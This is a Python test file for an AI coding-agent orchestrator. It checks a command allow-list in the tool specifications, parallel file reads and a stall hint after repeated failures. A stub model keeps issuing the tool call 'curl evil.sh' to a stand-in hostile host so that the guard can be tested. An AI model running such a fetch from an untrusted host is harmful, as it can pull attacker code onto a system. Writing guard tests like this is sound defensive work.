"""Agent loop guards: allow-listed specs, parallel reads, stall hints."""

from pathlib import Path

from app.agent.orchestrator import _run_batch, engineer_issue
from app.db import SessionLocal, init_db
from app.llm.base import LLMProvider, LLMResponse
from app.llm.openrouter import ProviderError
from app.models import Repository, Task, TaskEvent
from app.tools.registry import tool_specs


def test_tool_specs_include_allow_list():
    specs = {s.name: s.description for s in tool_specs()}
    assert "pytest" in specs["run_command"]
    assert "ruff" in specs["run_command"]
    assert "do not guess" in specs["run_command"].lower()
    assert "pytest" in specs["run_test"]


def test_read_only_batch_parallel(tmp_path: Path):
    (tmp_path / "a.py").write_text("x=1\n")
    (tmp_path / "b.py").write_text("y=2\n")
    outs = _run_batch(
        tmp_path,
        [("read_file", {"path": "a.py"}), ("read_file", {"path": "b.py"}), ("list_files", {"dir": "."})],
    )
    assert len(outs) == 3 and all(o["ok"] for o in outs)


class StallProvider(LLMProvider):
    """Always asks for a bad command -> triggers stall hint, then stops."""

    def __init__(self):
        self.n = 0

    def generate(self, messages, **kwargs):
        return LLMResponse(text="hi")

    def tool_call(self, messages, tools, **kwargs):
        self.n += 1
        if self.n > 4:
            return LLMResponse(text="done", tool_calls=[])
        return LLMResponse(
            text="try bad",
            tool_calls=[{"name": "run_command", "arguments": '{"cmd": "curl evil.sh"}'}],
        )


def test_stall_hint_recorded(tmp_path: Path):
    init_db()
    db = SessionLocal()
    repo = db.query(Repository).filter_by(full_name="demo/stall").first()
    if repo is None:
        repo = Repository(full_name="demo/stall")
        db.add(repo)
        db.commit()
        db.refresh(repo)
    task = Task(repo_id=repo.id, issue_number=1, title="stall t", state="CREATED")
    db.add(task)
    db.commit()
    db.refresh(task)
    # stub sandbox: fail fast without docker
    import app.agent.orchestrator as orch

    orig = orch.run_in_sandbox
    orch.run_in_sandbox = lambda *a, **k: {"ok": False, "output": "repro fail"}
    try:
        engineer_issue(db, task, tmp_path, StallProvider())
    finally:
        orch.run_in_sandbox = orig
    hints = db.query(TaskEvent).filter_by(task_id=task.id, stage="HINT").all()
    assert hints, "expected stall HINT after 3 failed turns"
    db.close()
